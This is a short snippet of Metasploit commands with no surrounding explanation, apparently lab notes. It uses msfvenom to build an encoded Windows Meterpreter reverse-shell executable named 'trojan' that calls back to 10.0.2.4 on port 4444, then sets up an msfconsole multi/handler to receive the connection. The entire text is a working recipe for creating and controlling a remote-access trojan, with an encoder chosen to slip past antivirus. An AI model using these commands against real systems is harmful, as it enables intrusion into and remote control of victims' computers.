msfvenom -p windows/meterpreter/reverse_tcp lhost=10.0.2.4 lport=4444 -e x86/shikata_ga_nai -f exe -o trojan

msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 10.0.2.4
exploit -j
